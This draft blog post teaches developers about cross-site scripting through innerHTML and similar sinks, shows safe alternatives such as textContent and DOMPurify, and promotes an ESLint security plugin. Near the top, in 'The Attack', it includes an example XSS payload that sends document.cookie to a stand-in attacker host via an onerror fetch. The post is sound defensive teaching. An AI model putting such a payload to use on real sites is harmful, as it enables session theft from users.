---
title: 'XSS in 2025: innerHTML is Still Your Enemy'
published: false
description: 'innerHTML enables XSS attacks. Here are the browser vulnerabilities ESLint catches and safe alternatives.'
tags: javascript, security, xss, eslint
cover_image:
series: Browser Security
---

# XSS in 2025: innerHTML is Still Your Enemy

```javascript
element.innerHTML = userInput;
```

This line has caused more security breaches than any other in browser history.

**In 2025, developers are still writing it.**

## The Attack

```javascript
// User submits this "name":
const userInput =
  '<img src=x onerror="fetch(`https://evil.com?cookie=${document.cookie}`)">';

// Your code:
document.getElementById('greeting').innerHTML = `Hello, ${userInput}`;

// Result: User's cookies sent to attacker
```

## Why It's Still Happening

| Reason                   | Reality                        |
| ------------------------ | ------------------------------ |
| "I sanitize the input"   | Sanitizers have bypasses       |
| "It's internal data"     | Data sources change            |
| "I only use it for HTML" | That HTML includes scripts     |
| "React prevents this"    | dangerouslySetInnerHTML exists |

## The Attack Surface

### 1. Direct innerHTML

```javascript
// ❌ Obvious danger
element.innerHTML = userInput;
```

### 2. document.write

```javascript
// ❌ Same vulnerability
document.write('<div>' + userInput + '</div>');
```

### 3. jQuery .html()

```javascript
// ❌ jQuery wrapper for innerHTML
$('#element').html(userInput);
```

### 4. outerHTML

```javascript
// ❌ Replaces entire element
element.outerHTML = `<div>${userInput}</div>`;
```

### 5. insertAdjacentHTML

```javascript
// ❌ Same risk, different method
element.insertAdjacentHTML('beforeend', userInput);
```

### 6. React's dangerouslySetInnerHTML

```jsx
// ❌ The name is a warning
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

## The Safe Alternatives

### For Text Content

```javascript
// ❌ innerHTML
element.innerHTML = userMessage;

// ✅ textContent (escapes HTML)
element.textContent = userMessage;
```

### For DOM Manipulation

```javascript
// ❌ innerHTML
container.innerHTML = `<p class="message">${text}</p>`;

// ✅ createElement + textContent
const p = document.createElement('p');
p.className = 'message';
p.textContent = text;
container.appendChild(p);
```

### For React

```jsx
// ❌ dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{ __html: userContent }} />

// ✅ Use a sanitizer library
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userContent) }} />

// ✅ Better: Avoid HTML entirely
<div>{userContent}</div>
```

### For Markdown/Rich Text

```javascript
// ✅ Use a dedicated library with built-in sanitization
import { marked } from 'marked';
import DOMPurify from 'dompurify';

const html = DOMPurify.sanitize(marked.parse(markdown));
```

## ESLint Catches All of These

```javascript
// eslint.config.js
import browserSecurity from 'eslint-plugin-browser-security';

export default [browserSecurity.configs.recommended];
```

### Browser XSS Rules

| Rule                          | What it catches               |
| ----------------------------- | ----------------------------- |
| `no-innerhtml`                | element.innerHTML assignments |
| `no-eval`                     | eval() with any input         |
| `no-postmessage-innerhtml`    | postMessage → innerHTML       |
| `no-filereader-innerhtml`     | FileReader → innerHTML        |
| `no-websocket-innerhtml`      | WebSocket → innerHTML         |
| `no-worker-message-innerhtml` | Web Worker → innerHTML        |

## Error Messages

```bash
src/components/Comment.tsx
  25:5  error  🔒 CWE-79 CVSS:6.1 | innerHTML with potentially unsafe content
               Risk: Cross-site scripting (XSS) attack
               Fix: Use textContent for text, or DOMPurify.sanitize() for HTML
```

## The DOMPurify Pattern

If you must render HTML:

```javascript
import DOMPurify from 'dompurify';

// Configure allowed tags/attributes
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a'],
  ALLOWED_ATTR: ['href', 'target'],
  ALLOW_DATA_ATTR: false,
});

element.innerHTML = clean;
```

## Quick Install

{% cta https://npmjs.com/package/eslint-plugin-browser-security %}
📦 npm install eslint-plugin-browser-security
{% endcta %}

```javascript
import browserSecurity from 'eslint-plugin-browser-security';
export default [browserSecurity.configs.recommended];
```

---

📦 [npm: eslint-plugin-browser-security](https://www.npmjs.com/package/eslint-plugin-browser-security)
📖 [Rule: no-innerhtml](https://github.com/ofri-peretz/eslint/tree/main/packages/eslint-plugin-browser-security/docs/rules/no-innerhtml.md)

{% cta https://github.com/ofri-peretz/eslint %}
⭐ Star on GitHub
{% endcta %}

---

🚀 **grep -r "innerHTML" in your codebase. What did you find?**

[GitHub](https://github.com/ofri-peretz) | [LinkedIn](https://linkedin.com/in/ofri-peretz)
